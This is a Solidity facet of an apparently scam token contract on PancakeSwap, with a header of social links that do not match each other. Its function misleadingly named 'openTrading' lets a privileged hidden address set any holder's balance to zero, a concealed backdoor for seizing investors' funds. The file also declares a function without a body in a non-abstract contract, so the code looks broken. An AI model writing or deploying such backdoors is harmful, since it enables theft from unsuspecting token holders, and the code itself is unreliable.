/*
 * SPDX-License-Identifier: MIT
 * Website: hhttps://www.xrex.io/?utm_source=icodrops
 * Facebook: https://discord.gg/anichess
 * Twitter: https://twitter.com/xrexinc
 * Telegram: https://t.me/xrexofficial
 * Linkedin: https://linkedin.com/company/xrexinc/
 * Medium: https://medium.com/xrexio
 */
pragma solidity ^0.8.24;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract getPairFacet {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
    function pancakePair() public view virtual returns (address) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return
            IPancakeFactory(ds.FACTORY).getPair(
                address(ds.WETH),
                address(this)
            );
    }
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ds.ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
}
